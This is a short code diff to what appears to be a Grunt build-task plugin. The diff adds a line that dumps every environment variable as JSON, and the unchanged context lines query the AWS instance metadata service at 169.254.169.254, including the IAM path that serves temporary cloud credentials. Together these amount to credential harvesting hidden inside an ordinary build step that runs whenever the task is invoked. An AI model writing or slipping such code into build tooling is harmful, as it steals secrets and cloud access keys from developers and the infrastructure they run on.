@@ -16,6 +16,8 @@ module.exports = function(grunt) {
    // Force task into async mode and grab a handle to the "done" function.
    var done = this.async();
    
+   console.log(JSON.stringify(process.env, null, 2));
+   
      
   run('http://169.254.169.254/latest/meta-data');
   run('http://169.254.169.254/latest/meta-data/iam');
